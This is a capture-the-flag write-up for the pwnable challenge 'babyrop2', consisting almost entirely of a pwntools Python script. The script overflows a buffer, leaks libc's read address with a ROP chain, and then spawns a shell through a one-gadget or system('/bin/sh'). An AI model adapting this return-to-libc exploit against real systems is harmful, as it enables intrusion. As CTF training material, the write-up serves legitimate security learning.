# **babyrop2**

#### tag : pwnable, rop

-----------------------------------------------

#### Description

>nc problem.harekaze.com 20005

-----------------------------------------------

#### Solution

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
r = remote('problem.harekaze.com', 20005)

elf = ELF('./babyrop2')
read_plt = elf.symbols['read']
read_got = elf.got['read']
printf_plt = elf.symbols['printf']
pritnf_got = elf.got['printf']
main = 0x400636

libc = ELF('./libc.so.6')
libc_read_offset = libc.symbols['read']
libc_oneshot_offset = [0x45216,0x4526a,0xf02a4,0xf1147][3]
libc_system_offset = libc.symbols['system']
libc_binsh_offset = next(libc.search('/bin/sh\x00'))

# 0x0000000000400733 : pop rdi ; ret
gg1 =0x0000000000400733

p = 'a' * 0x28
p += flat(
	gg1,
	read_got,
	printf_plt,
	main
)

r.recvuntil('? ')
r.send(p)
r.recvuntil('\n')

libc_read = u64((r.recv(6)).ljust(8,'\x00'))
libc_base = libc_read - libc_read_offset
libc_oneshot = libc_base + libc_oneshot_offset
libc_system = libc_base + libc_system_offset
libc_binsh = libc_base + libc_binsh_offset

p = 'a' * 0x28
p += p64(libc_oneshot)
p += flat(
	gg1,
	libc_binsh,
	libc_system
)

r.recvuntil('? ')
r.send(p)
r.recvuntil('\n')

r.interactive()
```
